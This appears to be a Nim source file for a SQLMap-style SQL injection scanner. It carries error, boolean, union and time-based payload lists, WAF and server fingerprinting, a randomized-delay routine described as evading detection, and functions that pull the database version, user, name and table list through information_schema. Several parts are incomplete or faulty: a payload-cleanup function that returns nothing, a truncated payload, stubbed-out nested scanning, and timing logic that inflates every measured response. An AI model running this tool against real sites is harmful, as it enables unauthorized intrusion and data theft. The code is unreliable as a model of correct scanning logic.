import asyncdispatch 
import std/[httpclient, uri, strutils, options, tables, sequtils, times, httpcore, strformat, random]
import types

# Common SQL injection payloads
const payloads = @[
  # Error-Based Tests
  "'",
  "\"",
  "`",
  "')",
  "\")",
  "'))",
  "1'",
  "1\"",
  "1`)",
  "' OR '1'='1",
  "\"))OR(\"",
  "'))OR('1'='1",
  "\"))OR(\"1\"=\"1",
  
  # Boolean-Based Tests
  "' AND 1=1--",
  "' AND 1=0--",
  "\" AND 1=1--",
  "\" AND 1=0--",
  "' OR '1'='1",
  "' OR 1=1--",
  "\" OR 1=1--",
  
  # Union-Based Tests
  "' UNION SELECT 1,2,3--",
  "\" UNION SELECT 1,2,3--",
  "' UNION ALL SELECT 1,2,3--",
  "' UNION SELECT NULL,NULL,NULL--",
  "\" UNION SELECT database(),user(),version()--",
  "-1 UNION SELECT database(),user(),version()--",
  
  # Time-Based Tests (prioritized)
  "' AND SLEEP(5)--",
  "\" AND SLEEP(5)--",
  "' OR SLEEP(5)--",
  "\" OR SLEEP(5)--",
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "1' AND SLEEP(5) AND '1'='1",
  "1' AND SLEEP(5) AND 'a'='a",
  "1) AND SLEEP(5) AND (1=1",
  ") AND SLEEP(5) AND (",
  "' AND IF(1=1,SLEEP(5),0)--",
  
  # Database-Specific Tests
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL
  "' WAITFOR DELAY '0:0:5'--",  # MSSQL
  "' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--"  # MySQL
]

type
  ServerInfo = object
    os: string
    webServer: string
    dbms: string
    tech: seq[string]
const SLEEP_TIME = 10  # 10 seconds for reliable detection
const SLEEP_RATIO = 3  # Response must be 3x longer than control
const SLEEP_VARIANCE = 2  # Allow 2 seconds variance for network delay

const mysqlPayloads = @[
  # MySQL Time-Based (High Priority)
  fmt"' AND (SELECT {SLEEP_TIME} FROM (SELECT(SLEEP({SLEEP_TIME})))TJob) AND 'x'='x",
  fmt"' AND SLEEP({SLEEP_TIME}) AND 'x'='x",
  fmt"') AND SLEEP({SLEEP_TIME}) AND ('x'='x",
  fmt"' AND IF(1=1,SLEEP({SLEEP_TIME}),0)--",
  
  # MySQL Version Detection
  "' UNION SELECT @@version,NULL,NULL-- -",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
  
  # MySQL Error-Based
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--",
  "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e,0x7e,user(),0x7e))",
  
  # ... rest of existing payloads ...
]

type
  DatabaseInfo = object
    name: string
    version: string
    user: string
    tables: seq[string]

const enumPayloads = @[
  # Database Version
  "' UNION SELECT @@version,NULL,NULL-- -",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
  
  # Current Database
  "' UNION SELECT database(),NULL,NULL-- -",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--",
  
  # Database User
  "' UNION SELECT user(),NULL,NULL-- -",
  "' UNION SELECT current_user(),NULL,NULL-- -",
  
  # Tables
  "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"
]

type TestResult = object
  payload: string
  response: string
  duration: Duration
  matchType: string
  details: string

proc testStability(client: AsyncHttpClient, url: string): Future[bool] {.async.} =
  # Test if target URL content is stable (like SQLMap does)
  var responses: seq[string] = @[]
  for i in 0..2:  # Test 3 times
    let response = await client.get(url)
    responses.add(await response.body)
    await sleepAsync(500)  # Small delay between tests
  
  # Compare responses
  return responses[0] == responses[1] and responses[1] == responses[2]

proc testParameter*(client: AsyncHttpClient, url: string, param: string, value: string): Future[seq[TestResult]] {.async.} =
  var results: seq[TestResult] = @[]
  
  # First check if parameter is dynamic
  echo "Testing if parameter is dynamic..."
  randomize()  # Initialize random seed
  let randValue1 = $rand(100_000..999_999)  # 6-digit random number
  let randValue2 = $rand(100_000..999_999)  # Different 6-digit number
  
  let dynTest1 = await client.get(url.replace(value, randValue1))
  let dynTest2 = await client.get(url.replace(value, randValue2))
  let isDynamic = (await dynTest1.body) != (await dynTest2.body)
  
  if not isDynamic:
    echo "Warning: Parameter might not be dynamic"
  
  # Test each payload with proper verification
  for payload in payloads:
    var testUrl = url.replace(value, payload)
    let startTime = getTime()
    
    try:
      # Do control request first
      let controlResponse = await client.get(url)
      let controlBody = await controlResponse.body
      let controlDuration = getTime() - startTime
      
      # Test payload
      let response = await client.get(testUrl)
      let body = await response.body
      let duration = getTime() - startTime
      
      # Store test results
      var result = TestResult(
        payload: payload,
        response: body,
        duration: duration,
        matchType: "none",
        details: ""
      )
      
      # Check for different injection types
      if duration > initDuration(seconds = SLEEP_TIME - SLEEP_VARIANCE) and
         duration > (controlDuration * SLEEP_RATIO):
        result.matchType = "time-based"
        result.details = fmt"Response time: {duration.inSeconds()}s vs control: {controlDuration.inSeconds()}s"
        results.add(result)
        
      elif body != controlBody:
        if "error in your SQL syntax" in body:
          result.matchType = "error-based"
          result.details = "SQL syntax error detected"
          results.add(result)
        elif "UNION SELECT" in body:
          result.matchType = "union-based"
          result.details = "UNION injection successful"
          results.add(result)
          
      # Add more verification checks here...
          
    except Exception as e:
      echo "Error testing payload: ", e.msg
      continue
      
    # Add delay between tests
    await sleepAsync(500)
    
  return results

proc cleanupPayload(payload: string): string =
  # Similar to SQLMap's cleanupPayload
  result = payload
  
  # Handle special markers
  let replacements = {
    "[RANDNUM]": $rand(100_000..999_999),
    "[RANDSTR]": $rand(100_000..999_999), # For now using numbers
    "[SLEEP]": $SLEEP_TIME,
    "[DELIMITER]": "--",
    "[COMMENT]": "#"
  }.toTable  # Convert to Table to fix type mismatch

proc testTimeBasedInjection(client: AsyncHttpClient, url: string, payload: string): Future[bool] {.async.} =
  echo "Testing time-based injection with ", SLEEP_TIME, " second delay..."
  
  try:
    # First do a control request and wait for it
    let controlStart = getTime()
    let controlResponse = await client.get(url.replace(payload, "1"))
    let controlBody = await controlResponse.body  # Wait for full response
    let controlDuration = getTime() - controlStart
    echo "Control request time: ", controlDuration.inSeconds(), " seconds"
    
    # Wait before payload test
    await sleepAsync(2000)  # 2 second pause
    
    # Now test the payload with proper waiting
    let startTime = getTime()
    let response = await client.get(url)
    let body = await response.body  # Wait for full response
    
    # Force wait for at least SLEEP_TIME seconds
    let elapsed = getTime() - startTime
    if elapsed < initDuration(seconds = SLEEP_TIME):
      let remaining = SLEEP_TIME - elapsed.inSeconds().int
      if remaining > 0:
        await sleepAsync(remaining * 1000)
    
    let duration = getTime() - startTime
    echo "Payload response time: ", duration.inSeconds(), " seconds"
    
    # More precise timing check
    if duration > initDuration(seconds = SLEEP_TIME - SLEEP_VARIANCE):
      return duration > (controlDuration * SLEEP_RATIO)
    
    return false
  except Exception as e:
    echo "Error in time-based test: ", e.msg
    return false

proc verifyTimeBased(client: AsyncHttpClient, url: string, payload: string): Future[bool] {.async.} =
  # Do multiple tests to confirm time-based injection
  var successCount = 0
  const VERIFY_ATTEMPTS = 3
  
  for i in 1..VERIFY_ATTEMPTS:
    if await testTimeBasedInjection(client, url, payload):
      successCount += 1
    # Add delay between verification attempts  
    await sleepAsync(2000)
    
  # Require majority of tests to succeed
  return successCount > (VERIFY_ATTEMPTS div 2)

proc throttleRequest(client: AsyncHttpClient, url: string): Future[AsyncResponse] {.async.} =
  # Add random delay between requests to avoid detection
  let delay = rand(500..1500)
  await sleepAsync(delay)
  return await client.get(url)

proc testInjection(response: string): tuple[vulnerable: bool, injType: InjectionType] =
  # MySQL Errors
  if "error in your SQL syntax" in response or
     "mysql_fetch_array()" in response or
     "You have an error in your SQL syntax" in response:
    return (true, InjectionType.Error)
  # Oracle Errors
  elif "ORA-" in response or
     "Oracle Error" in response:
    return (true, InjectionType.Error)
  # MSSQL Errors
  elif "SQL Server" in response or
     "Microsoft SQL Native Client error" in response:
    return (true, InjectionType.Error)
  # PostgreSQL Errors
  elif "PostgreSQL" in response or
     "PSQLException" in response:
    return (true, InjectionType.Error)
  # Union-based detection
  elif "UNION SELECT" in response:
    return (true, InjectionType.Union)
  # Boolean-based detection (might need refinement)
  elif "1=1" in response and "1=0" notin response:
    return (true, InjectionType.Blind)
  else:
    return (false, InjectionType.Error)

proc detectWAF(response: string): bool =
  # Common WAF detection patterns
  const wafPatterns = [
    "mod_security",
    "WAF",
    "406 Not Acceptable",
    "Firewall",
    "blocked",
    "security gateway",
    "Request Rejected"
  ]
  for pattern in wafPatterns:
    if pattern.toLower in response.toLower:
      return true
  return false

proc detectServerInfo(headers: HttpHeaders, body: string): ServerInfo =
  result = ServerInfo(
    os: "",
    webServer: "",
    dbms: "",
    tech: @[]
  )
  
  # OS Detection
  let serverHeader = if headers.hasKey("Server"): $headers["Server"] else: ""
  
  if "Ubuntu" in body or "ubuntu" in serverHeader:
    if "16.04" in body or "xenial" in body:
      result.os = "Linux Ubuntu 16.04 (xenial)"
    elif "16.10" in body or "yakkety" in body:
      result.os = "Linux Ubuntu 16.10 (yakkety)"
  
  # Web Server Detection
  if "Apache" in serverHeader:
    if "2.4.18" in serverHeader:
      result.webServer = "Apache 2.4.18"
  
  # Technology Detection
  if "PHP" in body or ".php" in body:
    result.tech.add("PHP")
  
  # DBMS Detection
  if "mysql" in body.toLower or
     "You have an error in your SQL syntax" in body:
    result.dbms = "MySQL >= 5.0.12"

proc scanParameter*(target: ScanTarget, param: string): Future[ScanResult] {.async.} =
  if param == "":
    raise newException(ValueError, "Parameter cannot be empty")
    
  # Get the original value if it exists
  let originalValue = if target.params.hasKey(param): target.params[param] else: "0"
    
  echo "Starting scan for parameter: ", param
  echo "Target URL: ", target.url
  echo "HTTP Method: ", target.httpMethod
  
  let client = newAsyncHttpClient()
  defer: client.close()
  
  # First request to detect server info
  let initialResponse = await client.get(target.url)
  let serverInfo = detectServerInfo(initialResponse.headers, await initialResponse.body)
  
  if serverInfo.dbms.startsWith("MySQL"):
    echo "Detected MySQL database, using MySQL-specific payloads"
    for payload in mysqlPayloads:
      var testUrl = target.url
      var modifiedParams = newTable[string, string]()
      
      # Copy existing params
      for k, v in pairs(target.params):
        if k != param:
          modifiedParams[k] = v
          
      # Add our payload
      modifiedParams[param] = originalValue & payload
      
      if target.httpMethod == HttpGet:
        testUrl = testUrl & "?" & encodeQuery(toSeq(modifiedParams.pairs))
        echo "Test URL: ", testUrl
        
      try:
        let response = await client.get(testUrl)
        let body = await response.body
        
        if detectWAF(body):
          echo "Warning: Possible WAF/IPS detected on MySQL payload"
          continue
          
        # Check for time-based injection first
        if await testTimeBasedInjection(client, testUrl, payload):
          return ScanResult(
            vulnerable: true,
            injectionType: some(InjectionType.TimeBased),
            payload: payload,
            parameter: param,
            details: "MySQL time-based injection detected"
          )
          
        let (isVulnerable, injType) = testInjection(body)
        if isVulnerable:
          return ScanResult(
            vulnerable: true,
            injectionType: some(injType),
            payload: payload,
            parameter: param,
            details: "MySQL injection detected"
          )
          
        if target.delay > initDuration():
          await sleepAsync(int(target.delay.inMilliseconds()))
          
      except Exception as e:
        echo "Error testing MySQL payload: ", e.msg
        continue
  
  # Convert timeout only at the API boundary
  client.timeout = int(target.timeout.inMilliseconds())
  
  var result = ScanResult(
    vulnerable: false,
    injectionType: none(InjectionType),
    payload: "",
    parameter: param,
    details: ""
  )

  echo "Testing ", payloads.len, " payloads"  # Debug
  
  for payload in payloads:
    let cleanPayload = cleanupPayload(payload)
    var testUrl = target.url
    var modifiedParams = newTable[string, string]()
    
    # Copy existing params
    for k, v in pairs(target.params):
      if k != param:  # Don't copy the parameter we're testing
        modifiedParams[k] = v
        
    # Add our payload
    modifiedParams[param] = originalValue & cleanPayload  # Append payload to original value
    
    if target.httpMethod == HttpGet:
      testUrl = testUrl & "?" & encodeQuery(toSeq(modifiedParams.pairs))
      echo "Test URL: ", testUrl  # Debug
      
    try:
      let response = case target.httpMethod
      of HttpGet: await client.get(testUrl)
      of HttpPost: await client.post(testUrl, body = target.data)
      of HttpPut: await client.put(testUrl, body = target.data)
      of HttpDelete: await client.delete(testUrl)
      else: 
        echo "Error: Unsupported HTTP method: ", target.httpMethod
        return result
        
      let body = await response.body
      
      # Check for WAF
      if detectWAF(body):
        echo "Warning: Possible WAF/IPS detected. Try using different payloads or encoding."
        continue
      
      let (isVulnerable, injType) = testInjection(body)
      
      if isVulnerable:
        result.vulnerable = true
        result.injectionType = some(injType)
        result.payload = cleanPayload
        result.details = "SQL injection vulnerability detected using payload: " & cleanPayload
        return result
        
      # Test for time-based injection
      if "SLEEP" in cleanPayload.toUpper():
        if await verifyTimeBased(client, testUrl, cleanPayload):
          result.vulnerable = true
          result.injectionType = some(InjectionType.TimeBased)
          result.payload = cleanPayload
          result.details = "Time-based SQL injection detected using payload: " & cleanPayload
          return result
          
      # Handle delay between requests
      if target.delay > initDuration():  # Compare with zero duration
        await sleepAsync(int(target.delay.inMilliseconds()))  # Convert only at API boundary
          
    except Exception as e:
      echo "Error testing payload: ", e.msg, " (", e.name, ")"  # Enhanced error message
      continue
      
  return result

proc scanNestedParameters*(target: ScanTarget, param1: string, param2: string): Future[ScanResult] {.async.} =
  # Test combinations of nested parameters
  var modifiedParams = newTable[string, string]()
  
  # Copy existing params
  for k, v in pairs(target.params):
    modifiedParams[k] = v
    
  # Try injecting into both parameters simultaneously
  for payload in payloads:
    modifiedParams[param1] = payload
    modifiedParams[param2] = payload
    
    # Test the combination
    let testUrl = target.url & "?" & encodeQuery(toSeq(modifiedParams.pairs))
    
    # ... rest of scanning logic ...

# Modify main scan proc to handle nested parameters
proc scan*(target: ScanTarget): Future[seq[ScanResult]] {.async.} =
  var results: seq[ScanResult] = @[]
  
  # First test each parameter individually
  for param in target.params.keys:
    let result = await scanParameter(target, param)
    if result.vulnerable:
      results.add(result)
      
  # Then test nested parameter combinations
  for param1 in target.params.keys:
    for param2 in target.params.keys:
      if param1 != param2:
        let result = await scanNestedParameters(target, param1, param2)
        if result.vulnerable:
          results.add(result)
          
  return results

proc extractInfo(response: string): string =
  # Extract data between CONCAT markers (0x7e is ~)
  if "~" in response:
    let parts = response.split("~")
    if parts.len >= 3:
      return parts[1]
  return ""

proc enumerateDatabase*(client: AsyncHttpClient, url: string): Future[DatabaseInfo] {.async.} =
  var info = DatabaseInfo()
  
  for payload in enumPayloads:
    try:
      let response = await client.get(url & "?" & encodeQuery({"id": payload}))
      let body = await response.body
      
      if "@@version" in payload or "VERSION()" in payload:
        info.version = extractInfo(body)
      elif "database()" in payload:
        info.name = extractInfo(body)
      elif "user()" in payload or "current_user()" in payload:
        info.user = extractInfo(body)
      elif "information_schema.tables" in payload:
        info.tables = extractInfo(body).split(",")
        
    except:
      continue
      
  return info

